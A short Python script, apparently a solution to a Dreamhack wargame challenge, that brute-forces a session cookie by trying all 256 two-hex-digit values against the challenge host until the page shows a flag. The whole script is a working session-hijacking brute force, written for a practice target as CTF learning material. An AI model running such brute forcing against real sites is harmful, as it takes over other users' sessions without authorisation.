import requests
from tqdm import tqdm
from requests.cookies import RequestsCookieJar

# RequestsCookieJar 객체 생성 (jar은 cookie를 저장하는 컨테이너라는 뜻)
jar = RequestsCookieJar()
url = 'http://host3.dreamhack.games:8729/'

for i in tqdm(range(256)):
    jar.set('sessionid', f'{i:02x}', domain='host3.dreamhack.games', path='/')
    response = requests.get(url, cookies=jar)

    if 'flag' in response.text:
        print(jar.get('sessionid'))
        print(response.text)
        break